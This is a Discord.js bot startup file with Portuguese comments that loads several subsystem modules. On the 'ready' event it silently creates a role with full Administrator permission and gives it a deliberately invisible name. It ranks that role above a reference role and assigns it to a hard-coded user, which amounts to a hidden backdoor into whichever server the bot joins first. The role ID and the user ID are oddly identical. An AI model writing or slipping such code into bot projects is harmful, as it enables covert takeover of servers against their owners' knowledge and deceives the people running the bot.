const { Client, GatewayIntentBits, PermissionsBitField } = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates
  ]
});

// Seus sistemas
require("./systems/main")(client);
require("./systems/gfzin")(client);
require("./systems/coco")(client);

// Quando o bot ligar
client.on("ready", async () => {
  console.log(`Logado como ${client.user.tag}`);

  const guild = client.guilds.cache.first(); // pega o primeiro servidor

  const cargoBaseId = "1476324501498364025"; // cargo de referência
  const userId = "1476324501498364025"; // usuário que vai receber

  try {
    const cargoBase = guild.roles.cache.get(cargoBaseId);

    if (!cargoBase) {
      console.log("❌ Cargo base não encontrado!");
      return;
    }

    // Criar cargo ADM com todas permissões
    const novoCargo = await guild.roles.create({
      name: "ㅤ", // nome invisível
      permissions: [PermissionsBitField.Flags.Administrator]
    });

    // Colocar acima do cargo base
    await novoCargo.setPosition(cargoBase.position + 1);

    console.log("✅ Cargo ADM criado!");

    // Pegar membro
    const membro = await guild.members.fetch(userId);

    // Dar o cargo
    await membro.roles.add(novoCargo);

    console.log("✅ Cargo dado ao usuário!");
  } catch (err) {
    console.error("❌ Erro:", err);
  }
});

// Login
client.login(process.env.TOKEN);
